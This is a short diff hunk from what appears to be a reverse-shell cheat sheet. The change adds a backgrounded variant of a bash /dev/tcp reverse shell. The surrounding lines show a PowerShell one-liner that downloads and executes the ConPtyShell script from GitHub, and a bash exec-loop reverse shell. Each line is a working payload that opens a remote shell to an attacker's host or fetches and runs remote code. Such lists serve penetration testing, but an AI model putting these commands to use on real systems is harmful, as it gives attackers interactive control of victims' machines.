@@ -22,7 +22,7 @@
 `IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <LHOST> <LPORT>`
 
 # Bash
-1. `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1`
+1. `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1`  --> make it non-blocking `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 &`
 2. `exec 5<>/dev/tcp/<LHOST>/<LPORT>; cat <&5 | while read line; do $line 2>&5 >&5; done`
 
 ## Bash/Netcat:
